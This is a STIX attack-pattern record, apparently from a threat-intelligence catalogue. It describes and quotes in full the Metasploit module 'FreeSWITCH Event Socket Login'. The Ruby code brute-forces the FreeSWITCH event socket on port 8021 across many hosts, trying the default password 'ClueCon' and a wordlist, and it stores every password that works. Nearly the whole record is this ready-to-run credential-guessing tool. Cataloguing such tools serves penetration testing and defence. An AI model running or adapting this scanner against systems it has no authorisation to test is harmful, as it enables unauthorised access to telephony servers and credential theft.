{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f231937-1692-46fa-a313-2fdf4c7a6b73",
    "created": "2024-08-14T16:27:09.302337Z",
    "modified": "2024-08-14T16:27:09.30234Z",
    "name": "FreeSWITCH Event Socket Login",
    "description": " This module tests FreeSWITCH Event Socket logins on a range of machines and report successful attempts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/freeswitch_event_socket_login.rb",
            "external_id": "freeswitch_event_socket_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/freeswitch_event_socket'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FreeSWITCH Event Socket Login',\n        'Description' => %q{\n          This module tests FreeSWITCH Event Socket logins on a range of\n          machines and report successful attempts.\n        },\n        'Author' => [\n          'krastanoel'\n        ],\n        'References' => [\n          ['URL', 'https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket']\n        ],\n        'DefaultOptions' => { 'VERBOSE' => false },\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8021),\n        OptString.new('PASSWORD', [false, 'FreeSWITCH event socket default password', 'ClueCon']),\n        OptPath.new('PASS_FILE',\n                    [\n                      false,\n                      'The file that contains a list of of probable passwords.',\n                      File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')\n                    ])\n      ]\n    )\n\n    # freeswitch does not have an username, there's only password\n    deregister_options(\n      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING', 'BLANK_PASSWORDS',\n      'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE',\n      'PASSWORD_SPRAY', 'STOP_ON_SUCCESS'\n    )\n  end\n\n  def run_host(ip)\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(\n      password: datastore['PASSWORD'],\n      pass_file: datastore['PASS_FILE']\n    )\n    cred_collection = prepend_db_passwords(cred_collection)\n\n    scanner = Metasploit::Framework::LoginScanner::FreeswitchEventSocket.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      stop_on_success: true, # this will have no effect due to the scanner behaviour when scanning without username\n      connection_timeout: 10\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n\n      if result.success?\n        credential_data.delete(:username) # This service uses no username\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        if datastore['VERBOSE']\n          vprint_good(\"Login Successful: #{result.credential.private} (#{result.status}: #{result.proof&.strip})\")\n        else\n          print_good(\"Login Successful: #{result.credential.private}\")\n        end\n      else\n        invalidate_login(credential_data)\n        vprint_error(\"LOGIN FAILED: #{result.credential.private} (#{result.status}: #{result.proof&.strip})\")\n      end\n    end\n  end\n\n  def check_host(_ip)\n    connect\n    banner = sock.get\n    disconnect(sock)\n\n    if banner.include?('Access Denied, go away.') || banner.include?('text/rude-rejection')\n      return Exploit::CheckCode::Safe('Access denied by network ACL')\n    end\n\n    unless banner.include?('Content-Type: auth/request')\n      return Exploit::CheckCode::Unknown('Unable to determine the service fingerprint')\n    end\n\n    return Exploit::CheckCode::Appears\n  end\nend\n"
}